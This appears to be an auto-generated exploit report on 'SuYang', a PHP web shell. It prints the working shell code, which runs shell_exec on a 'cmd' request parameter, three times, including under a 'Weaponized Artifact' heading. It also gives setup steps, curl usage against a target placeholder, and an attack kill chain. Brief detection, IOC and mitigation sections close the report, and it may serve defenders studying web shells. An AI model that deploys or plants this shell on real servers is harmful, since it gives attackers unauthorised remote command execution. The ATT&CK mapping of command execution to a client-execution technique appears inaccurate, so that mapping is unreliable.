# POCArchitect Report: SuYang - A Simple Web Shell

**Source:** https://github.com/0x727/SuYang  
**Date Analyzed:** 2026-04-01  
**Status:** Research-Only  
**CVE(s):** None assigned  
**Target:** Web Applications  
**Language:** PHP

---

## 1. Tactical Summary
SuYang is a simple web shell written in PHP that allows an attacker to execute commands on a compromised server through a web interface. It targets web applications that allow file uploads without proper validation, enabling remote code execution (RCE). The vulnerability it exploits is typically associated with improper file handling and validation in web applications. This POC is significant as it demonstrates how easily an attacker can gain control over a server if file upload mechanisms are not secured. The POC is classified as **Research-Only** because it serves as a demonstration of a web shell without being fully weaponized for immediate exploitation.

## 2. Technical Deep Dive
1. **Entry point and attack surface**: The entry point for the SuYang web shell is a PHP file that is uploaded to a vulnerable web server. The shell listens for HTTP requests on the web server, typically on port 80 or 443.
   
2. **Trigger mechanism**: The vulnerability is triggered when a user uploads the PHP web shell to the server. If the server does not properly validate the file type, the PHP code can be executed.

3. **Payload behavior**: Once the web shell is executed, it allows the attacker to run arbitrary commands on the server, read files, and potentially escalate privileges.

4. **Code walkthrough**: The main functionality of the web shell is encapsulated in the `index.php` file. Here is a critical snippet:
   ```php
   if (isset($_REQUEST['cmd'])) {
       echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
   }
   ```
   This code checks if a `cmd` parameter is present in the request and executes it using `shell_exec()`, which allows command execution on the server.

5. **Preconditions**: The target server must have PHP installed and configured to allow the execution of uploaded scripts. Additionally, the web server must not have restrictions on file uploads.

6. **Protocol or memory-level details**: The web shell communicates over HTTP, and the commands are sent as URL parameters.

7. **Full kill chain summary**: 
   1. Attacker identifies a vulnerable web application that allows file uploads.
   2. Attacker uploads the `index.php` web shell.
   3. Attacker accesses the web shell via a web browser.
   4. Attacker sends commands through the `cmd` parameter.
   5. The server executes the commands and returns the output.

## 3. Risk Assessment
| Metric               | Rating        | Detail |
|----------------------|---------------|--------|
| Severity             | High          | ~7.5   |
| Exploitability       | Intermediate   | Requires knowledge of web application vulnerabilities. |
| Blast Radius         | Single host   | Limited to the compromised server. |
| Detection Difficulty | Moderate      | May be detected through unusual HTTP requests or file uploads. |
| Patch Status         | Unpatched     | Requires proper validation of file uploads. |

## 4. Build Instructions
### 4.1 Environment Requirements
- OS: Any server with PHP support (e.g., Ubuntu 20.04)
- Language runtime: PHP 7.0 or higher
- Web server: Apache or Nginx

### 4.2 Prerequisites
```bash
sudo apt update
sudo apt install apache2 php libapache2-mod-php
```

### 4.3 Clone / Download
Since the repository is not accessible, manually create the `index.php` file with the following content:
```php
<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
```

### 4.4 Build / Compile
N/A — PHP is an interpreted language.

### 4.5 Configuration
- Place the `index.php` file in the web server's document root (e.g., `/var/www/html/` for Apache).

### 4.6 Execution syntax with example arguments
Access the web shell via a web browser:
```
http://<TARGET_IP>/index.php?cmd=whoami
```

### 4.7 Troubleshooting
If the web shell does not execute commands:
- Ensure PHP is installed and running.
- Check web server error logs for any issues.

## 5. Execution Playbook

### Basic Usage
```bash
curl "http://<TARGET_IP>/index.php?cmd=ls"
```

### Advanced Modes / Stages
N/A

### Operator-Replaceable Values
| Placeholder       | Description             | Example         |
|-------------------|-------------------------|-----------------|
| `<TARGET_IP>`     | Target host IP          | `192.168.1.100` |

## 6. Expected Output
On successful execution, the output will display the result of the command executed. For example, running `ls` will show the directory contents:
```
file1.txt
file2.php
uploads/
```
A failure may occur if the PHP script is not executed, resulting in a blank page or an error message.

## 7. Weaponized Artifact
```php
<?php
if (isset($_REQUEST['cmd'])) {
    // Execute the command passed via the 'cmd' parameter
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
```
This code allows for command execution on the server. Modify the `cmd` parameter in the URL to execute different commands.

## 8. MITRE ATT&CK TTP Map

| # | Tactic          | Technique ID | Technique Name          | POC Implementation |
|---|-----------------|--------------|-------------------------|---------------------|
| 1 | Initial Access  | T1190        | Exploit Public-Facing Application | Uploading the web shell to the server. |
| 2 | Execution       | T1203        | Exploitation for Client Execution | Executing commands via the web shell. |

**Kill Chain Narrative:** The attacker exploits a vulnerability in the web application to upload a PHP web shell, which allows them to execute arbitrary commands on the server. This is achieved through the use of the `cmd` parameter in the web shell.

## 9. Detection Signatures

| Rule / Pattern | Type | Covers TTP | Detail |
|----------------|------|------------|--------|
| Suspicious File Upload | Snort | T1190 | Detects unusual file types being uploaded to the server. |
| Command Execution via Web Shell | YARA | T1203 | Identifies patterns of command execution in web shell scripts. |

## 10. Indicators of Compromise

| IOC Type | Value | Context |
|----------|-------|---------|
| File Path | `/var/www/html/index.php` | Location of the web shell on the server. |

## 11. Mitigations
- Implement strict file type validation for uploads (MITRE M1040).
- Use web application firewalls (WAF) to filter out malicious requests (MITRE M1030).
- Regularly update and patch web server software to mitigate known vulnerabilities.

---
_Report generated by **POCArchitect** — 2026-04-01_